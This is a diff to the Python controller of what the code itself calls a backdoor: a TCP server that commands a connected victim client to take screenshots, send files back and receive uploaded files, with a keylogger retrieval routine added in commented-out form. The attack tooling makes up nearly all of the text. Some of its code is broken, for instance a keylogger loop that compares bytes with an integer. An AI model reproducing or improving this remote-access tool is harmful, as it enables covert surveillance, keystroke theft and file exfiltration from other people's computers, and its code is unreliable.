@@ -3,6 +3,7 @@ import sys
 import time
 import os
 import subprocess
+from typing import ContextManager
 ### Server
 
 class TcpServer:
@@ -140,10 +141,33 @@ class TcpServer:
                         self.server.close()
                         sys.exit()
 
-                    """if message_command == "keylogger_stop":
-                        # self.client.send("keylogger_stop".encode())
-                        print("Backdoor session finished! Exiting... o/")
-                        sys.exit()"""
+
+                    """if message_command == "keylogger_start":
+                        print("You must specify a range of letters! Ex: keylogger_start 20")
+                        continue
+
+                    if message_command.startswith("keylogger_start "):
+                        self.client.send(message_command.encode())
+                        #print("\033[0;31m[+]\033[0;0m - Keylogger Started!")
+                        while True:
+                            keylogger_ok = self.client.recv(1024).decode()
+                            #print("\033[0;31m[+]\033[0;0m - Getting Keylogger file Size...")
+                            if keylogger_ok == "OK!":
+                                keylogger_file_size = self.client.recv(1024).decode()
+                                kbyt = b""
+                                while kbyt < int(keylogger_file_size):
+                                    kbyt += int(keylogger_file_size)
+
+                            #print("\033[0;31m[+]\033[0;0m - Writing keys to a file named extkey.txt...")
+                            with open("extkey.txt","wb") as kby:
+                                kby.write(kbyt)
+                            #print("\033[0;31m[+]\033[0;0m - KeyLogger file Finished Downloading! \n \033[0;31m[+]\033[0;0m - Returning to input...")
+                            continue"""
+
+                        
+
+
+                    # Screenshot: Maybe not work perfect in linux systems
 
                     if message_command == "screenshot":
 
@@ -163,6 +187,46 @@ class TcpServer:
                         print(f"\033[1;32m[+]\033[0;0m - Screenshot Download finished! File Size: {str(int_screenshot_size)} \nGoing Back to Input...")
                         continue
 
+
+
+                    # Uploading FIles
+
+                    if message_command == "upload":
+                        print("You must specify a file!")
+                        continue
+
+                    # need to pass 2 parameters, where is the file and the file: /home/file.txt, especify the name you want to the file to become, Ex: kleiton
+                    if message_command.startswith("upload "):
+                        try:
+                            location_filename = message_command.split(" ")[1]
+                            self.client.send(message_command.encode())
+                        
+                        
+                            up_data = os.path.getsize(location_filename)
+                            self.client.send(str(up_data).encode("utf-8"))
+
+                            with open(location_filename,"rb") as up:
+                                up_filedata = up.read()
+                                self.client.send(up_filedata)
+
+                            transference_done = self.client.recv(1024).decode()
+                            print(transference_done)
+
+                            continue
+                        except IsADirectoryError:
+                            print("\033[0;31m[!]\033[0;0m - Incorrect file type, Need to especify a file! Backing to input...")
+                            continue
+                        except:
+                            print("SOmething went wrong! Going back to the input...")
+                            continue
+                    
+
+                    # Downloading files
+
+                    if message_command == "download":
+                        print("You must specify a file!")
+                        continue
+
                     if message_command.startswith("download "):
 
                         file_name = message_command.split(" ")[1]
@@ -178,8 +242,9 @@ class TcpServer:
                             while len(str_data) < int_screenshot_size:
                                 str_data += self.client.recv(int_screenshot_size)
             
-                            with open(f"/home/ferreira/Documents/{file_name}","wb") as sc:
+                            with open(file_name,"wb") as sc:
                                 sc.write(str_data)
+
                             print(f"\033[1;32m[+]\033[0;0m - Download to {file_name} finished! File Size: {str(int_screenshot_size)} \n\033[1;32m[+]\033[0;0m - Going Back to Input...")
                             continue
                         except IsADirectoryError:
